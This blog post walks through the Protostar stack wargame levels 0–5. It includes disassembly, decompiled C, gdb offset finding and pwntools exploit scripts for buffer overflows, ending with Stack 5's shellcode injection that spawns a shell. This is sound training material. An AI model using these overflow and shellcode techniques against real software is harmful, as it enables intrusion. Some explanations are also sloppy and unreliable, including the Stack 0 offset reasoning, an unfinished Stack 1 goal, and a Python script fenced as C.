---
layout: post
title: Protostar Stack Writeups
description:
date: 2025-04-23
categories:
  - writeup
tags:
  - protostar-stack
---
# Protostar Stack Writeups

## Stack 0

**GOAL** : Modify a variable

```sh
0x08048405 <+17>:	lea    eax,[esp+0x1c]
0x08048409 <+21>:	mov    DWORD PTR [esp],eax
0x0804840c <+24>:	call   0x804830c <gets@plt>

```

This takes user input and stores it at [esp+0x1c]

```sh
   0x080483fd <+9>:	    mov    DWORD PTR [esp+0x5c],0x0
   0x08048411 <+29>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:	test   eax,eax
   0x08048417 <+35>:	je     0x8048427 <main+51>
   0x08048419 <+37>:	mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
   0x08048427 <+51>:	mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:	call   0x804832c <puts@plt>
   0x08048433 <+63>:	leave
   0x08048434 <+64>:	ret

```

Stores 0 into a variable, then compares the variable to 0;
IF true it prints "Try Again"
If false it prints "You have changed the 'modified variable"

**Ghidra Decompiled code**
```c

void main(void)

{
  char buffer [64];
  int please_change_me;
  
  please_change_me = 0;
  gets(buffer);
  if (please_change_me == 0) {
    puts("Try again?");
  }
  else {
    puts("you have changed the \'modified\' variable");
  }
  return;
}

```


---
## Developing Exploit

1. Find the  Offset (Using gdb)
	- set breakpoints at main function and `ret` instruction 
	- run the program in gdb 
	- Create pattern to fill in buffer 
```sh
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
[+] Saved as '$_gef1'
```

- Continue and fill in the program 
- check if the is a buffer overflow

```sh
gef➤  x/wx $ebp
0x61616174:	Cannot access memory at address 0x61616174

```
- Get the buffer size
```sh
gef➤  pattern search 0x61616174
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 76 (little-endian search) likely

```

Buffer size = 76
Offset = 80 | because we need to override the ebp which takes up 4 bytes


**Exploit**
```python
#!/usr/bin/python3

from pwn import *

binary = "./stack0"
elf = ELF(binary)
p = process(binary)
#goal is to modify varaible
buf_size = 76
offset = 80

payload = b"A"*offset
payload += p32(0x2) # change the varible to 2

p.sendline(payload)
p.interactive()
```

## Stack 1

**Goal** : Modify the variable to be 

```
./stack1 $(python3 -c 'print("A"*64 + "\x64\x63\x62\x61")')
```

## Stack 2

Code

```c
void main(void)
{
  char buffer [64];
  int change_me;
  char *env;

  env = getenv("GREENIE");
  if (env == (char *)0x0) {
    errx(1,"please set the GREENIE environment variable\n");
  }
  change_me = 0;
  strcpy(buffer,env);
  if (change_me == 0xd0a0d0a) {
    puts("you have correctly modified the variable");
  }
  else {
    printf("Try again, you got 0x%08x\n",change_me);
  }
  return;
}
```

we need to put our exploit in the environment variable `GREENIE`

To modify the `change_me` variable we just need to fill in the buffer then put what we want to put in the `change_me` variable which is `\x0a\x0d\x0a\x0d` in this case (little endian)



```sh
export GREENIE=$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")')
```

```sh
/stack2 
you have correctly modified the variable
```

## Stack 3

Source 

```c
void main(void)
{
  char buffer [64];
  code *func_ptr;
  
  func_ptr = (code *)0x0;
  gets(buffer);
  if (func_ptr != (code *)0x0) {
    printf("calling function pointer, jumping to 0x%08x\n",func_ptr);
    (*func_ptr)();
  }
  return;
}

void win(void)
{
  puts("code flow successfully changed");
  return;
}
```

Our exploit needs to fill up the buffer and call the address (pointer ) of the `win` function

**Exploit**

```python 
#!/usr/bin/python3

from pwn import *

binary = "./stack3"
elf = ELF(binary)
p = process(binary)

buffer_size = 64

addr = p32(elf.sym["win"]) # address of the win function 

payload = b"A"*buffer_size
payload += addr

p.sendline(payload)
p.interactive()
```

## Stack 4

```python
#!/usr/bin/python3

from pwn import *

binary = "./stack4"
elf = ELF(binary)
p = process(binary)

win_func = p32(elf.sym['win'])
buf_size = 76

payload = b"A"*buf_size
payload += win_func

p.sendline(payload)
p.interactive()
```

## Stack 5

```c
#!/usr/bin/python

from pwn import *

binary = "./stack5"
elf = ELF(binary)
p = process(binary)

buf_size = 76
shellcode = asm(shellcraft.sh())
ret_addr = p32(0xffffcdd0) # buffer address

payload = b"\x90"*(buf_size - len(shellcode))
payload += shellcode
payload += ret_addr

log.info(f"Buffer size: {buf_size}")
log.info(f"Shellcode size: {len(shellcode)}")
log.info(f"NOP sled size: {buf_size - len(shellcode)}")
log.info(f"Return address: {hex(u32(ret_addr))}")
log.info(f"Payload: {payload}")

p.sendline(payload)
p.interactive()
```